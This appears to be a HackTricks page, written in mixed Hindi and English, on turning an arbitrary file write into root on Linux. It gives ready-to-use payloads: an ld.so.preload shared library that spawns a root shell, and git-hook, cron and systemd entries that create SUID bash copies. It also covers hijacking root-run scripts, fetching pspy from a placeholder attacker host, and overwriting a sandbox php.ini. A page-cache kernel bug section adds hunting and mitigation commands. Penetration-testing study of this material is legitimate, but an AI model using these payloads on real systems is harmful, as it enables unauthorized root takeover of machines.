# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env variable की तरह behave करती है, लेकिन यह **SUID binaries** में भी काम करती है।\
अगर आप इसे create या modify कर सकते हैं, तो आप बस **एक library का path** add कर सकते हैं जिसे हर executed binary के साथ load किया जाएगा।

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ऐसे **scripts** हैं जो git repository में विभिन्न **events** पर **run** होते हैं, जैसे जब कोई commit बनता है, merge... इसलिए अगर कोई **privileged script or user** यह actions अक्सर कर रहा है और **`.git` folder** में **write** करना possible है, तो इसका उपयोग **privesc** के लिए किया जा सकता है।

उदाहरण के लिए, git repo में **`.git/hooks`** के अंदर एक **script** generate करना possible है, ताकि जब भी नया commit create हो, वह हमेशा execute हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

अगर आप **cron-related files लिख सकते हैं जिन्हें root execute करता है**, तो आमतौर पर job अगली बार चलने पर आपको code execution मिल सकती है। Interesting targets में शामिल हैं:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root का अपना crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
सामान्य दुरुपयोग paths:

- **`/etc/crontab` या `/etc/cron.d/` में किसी file में एक नया root cron job जोड़ें**
- **`run-parts` द्वारा पहले से execute की जा रही किसी script को replace करें**
- **जिस script या binary को यह launch करता है, उसे modify करके किसी existing timer target में backdoor डालें**

Minimal cron payload example:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
यदि आप केवल `run-parts` द्वारा उपयोग की जाने वाली cron directory के अंदर लिख सकते हैं, तो इसके बजाय वहाँ एक executable file डालें:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` आमतौर पर dots वाले filenames को ignore करता है, इसलिए `backup.sh` की बजाय `backup` जैसे names prefer करें।
- कुछ distros classic cron की बजाय `anacron` या `systemd` timers use करती हैं, लेकिन abuse idea वही है: **बाद में root जो execute करेगा उसे modify करें**।

### Service & Socket files

अगर आप **`systemd` unit files** या उनके द्वारा referenced files में write कर सकते हैं, तो unit को reload और restart करके, या service/socket activation path trigger होने का इंतज़ार करके, root के रूप में code execution हासिल कर सकते हैं।

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा referenced service scripts/binaries
- Root service द्वारा loaded writable `EnvironmentFile=` paths

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
सामान्य abuse paths:

- **`ExecStart=` को overwrite करें** किसी root-owned service unit में जिसे आप modify कर सकते हैं
- **एक drop-in override जोड़ें** एक malicious `ExecStart=` के साथ और पहले पुराने को clear करें
- **उस script/binary को backdoor करें** जिसे unit पहले से reference कर रही है
- **एक socket-activated service को hijack करें** corresponding `.service` file को modify करके जो socket के connection receive करने पर start होती है

Example malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typical activation flow:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
यदि आप services को स्वयं restart नहीं कर सकते, लेकिन एक socket-activated unit को edit कर सकते हैं, तो आपको backdoored service को root के रूप में execute कराने के लिए केवल **एक client connection का इंतज़ार** करना पड़ सकता है।

### एक privileged PHP sandbox द्वारा उपयोग किए गए restrictive `php.ini` को overwrite करें

कुछ custom daemons user-supplied PHP को `php` को एक **restricted `php.ini`** के साथ चलाकर validate करते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। अगर sandboxed code के पास अभी भी **कोई भी write primitive** है (जैसे `file_put_contents`) और आप daemon द्वारा उपयोग किए गए **exact `php.ini` path** तक पहुँच सकते हैं, तो आप उस config को **overwrite** करके restrictions हटवा सकते हैं और फिर एक दूसरा payload submit कर सकते हैं जो elevated privileges के साथ चलता है।

Typical flow:

1. पहला payload sandbox config को overwrite करता है।
2. दूसरा payload code execute करता है, अब जब dangerous functions फिर से enabled हो चुके हैं।

Minimal example (daemon द्वारा उपयोग किए गए path को replace करें):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
यदि daemon root के रूप में चलता है (या root-owned paths के साथ validate करता है), तो दूसरा execution root context देता है। यह मूल रूप से **privilege escalation via config overwrite** है जब sandboxed runtime अभी भी files लिख सकता है।

### binfmt_misc

`/proc/sys/fs/binfmt_misc` में स्थित file यह बताती है कि किस binary को किस type of files execute करनी चाहिए। TODO: common file type open होने पर rev shell execute करने के लिए इसका abuse करने की requirements check करें।

### Overwrite schema handlers (like http: or https:)

एक attacker जिसके पास victim की configuration directories पर write permissions हैं, वह आसानी से ऐसे files replace या create कर सकता है जो system behavior बदल दें, जिससे unintended code execution हो। `$HOME/.config/mimeapps.list` file को modify करके HTTP और HTTPS URL handlers को एक malicious file की ओर point करने से (जैसे, `x-scheme-handler/http=evil.desktop` set करके), attacker यह सुनिश्चित करता है कि **किसी भी http या https link पर click करने से `evil.desktop` file में specified code trigger हो**। उदाहरण के लिए, `$HOME/.local/share/applications` में निम्न malicious code `evil.desktop` में रखने के बाद, कोई भी external URL click embedded command को run करता है:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
अधिक जानकारी के लिए [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) देखें, जहां इसका उपयोग एक वास्तविक vulnerability exploit करने के लिए किया गया था।

### Root executing user-writable scripts/binaries

यदि कोई privileged workflow `/bin/sh /home/username/.../script` जैसा कुछ चलाता है (या किसी unprivileged user के स्वामित्व वाली directory के अंदर कोई binary), तो आप उसे hijack कर सकते हैं:

- **Execution detect करें:** root द्वारा user-controlled paths invoke किए जाने को पकड़ने के लिए [pspy](https://github.com/DominicBreuker/pspy) के साथ processes monitor करें:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **लेखनयोग्यता की पुष्टि करें:** सुनिश्चित करें कि target file और उसकी directory दोनों आपके user के owned/writable हों।
- **target को hijack करें:** original binary/script का backup लें और ऐसा payload drop करें जो एक SUID shell (या कोई अन्य root action) बनाए, फिर permissions restore करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Privileged action को ट्रिगर करें** (जैसे, कोई UI button दबाना जो helper spawn करता है)। जब root hijacked path को फिर से execute करता है, तो `./rootshell -p` के साथ escalated shell पकड़ लें।

### Privileged binaries का Page-cache-only file modification

कुछ kernel bugs file को **disk** पर modify नहीं करते। इसके बजाय, वे केवल किसी readable file की **page cache copy** को modify करने देते हैं। अगर आप किसी **setuid** या अन्यथा **root-executed** binary को target कर सकते हैं, तो अगला execution memory से attacker-controlled bytes चला सकता है और privileges escalate कर सकता है, भले ही disk पर file hash unchanged रहे।

इसे एक **runtime-only file write primitive** के रूप में समझना उपयोगी है:

- **Disk साफ रहता है**: inode और on-disk bytes change नहीं होते
- **Memory dirty होती है**: cached page पढ़ने/execute करने वाले processes attacker-modified content देखते हैं
- **Effect temporary होता है**: reboot या cache eviction के बाद change गायब हो जाता है

यह primitive classic **arbitrary file write** और पुराने **page-cache abuse** bugs जैसे Dirty COW / Dirty Pipe के बीच आता है:

- Dirty COW एक race पर निर्भर था
- Dirty Pipe में write-position constraints थे
- अगर vulnerable path cached file-backed pages में direct writes देता है, तो page-cache-only primitive ज्यादा reliable हो सकता है

#### Generic privesc flow

1. एक kernel primitive प्राप्त करें जो **file-backed page cache pages** में write कर सके
2. इसे किसी **readable privileged binary** या किसी अन्य root-executed file के खिलाफ उपयोग करें
3. page evict होने से **पहले** execution trigger करें
4. on-disk file अभी भी unmodified दिखते हुए root के रूप में code execution प्राप्त करें

Typical high-value targets:

- **setuid-root** binaries
- **root services** द्वारा launched helpers
- containers में commonly executed binaries जो host kernel/page cache share करते हैं

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) इस class का एक अच्छा example है। Vulnerable path Linux crypto userspace API (`AF_ALG` / `algif_aead`) में था:

- `splice()` किसी readable file से page-cache pages के references को crypto TX scatterlist में move कर सकता है
- in-place `algif_aead` decrypt path ने source और destination buffers को reuse किया
- `authencesn` ने फिर destination tag region में write किया
- जब वह region अभी भी spliced file-backed pages को reference कर रहा था, तब write target file की **page cache** में landed हुआ

तो interesting technique CVE खुद नहीं, बल्कि pattern है:

- **file-backed cache pages को kernel subsystem में feed करें**
- subsystem से उन्हें **writable output** की तरह treat कराएँ
- memory में एक छोटा controlled overwrite trigger करें

Public PoC ने `/usr/bin/su` को memory में patch करने के लिए repeated **4-byte writes** का उपयोग किया और फिर उसे execute किया।

#### Exposure and hunting

अगर आपको इस class का bug suspect हो, तो सिर्फ disk integrity checks पर निर्भर न रहें। यह भी verify करें:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` मॉड्यूल के रूप में loadable/unloadable हो सकता है
- `CONFIG_CRYPTO_USER_API_AEAD=y`: यह interface kernel में built-in है
- setuid binaries अच्छे targets हैं क्योंकि page-cache-only patch local foothold को root में बदलने के लिए पर्याप्त हो सकता है

#### `algif_aead` path के लिए attack-surface reduction

अगर vulnerable interface एक loadable module द्वारा प्रदान किया जाता है:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
यदि यह kernel में compiled है, तो कुछ disclosures ने init path को block करते हुए यह रिपोर्ट किया:
```bash
initcall_blacklist=algif_aead_init
```
यह तरह की mitigation अन्य kernel LPEs के लिए भी याद रखने लायक है: अगर exploitation किसी specific optional interface पर निर्भर करता है, तो उस interface को disable या blacklist करने से exploit path टूट सकता है, भले ही full kernel upgrade अभी उपलब्ध न हो।

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
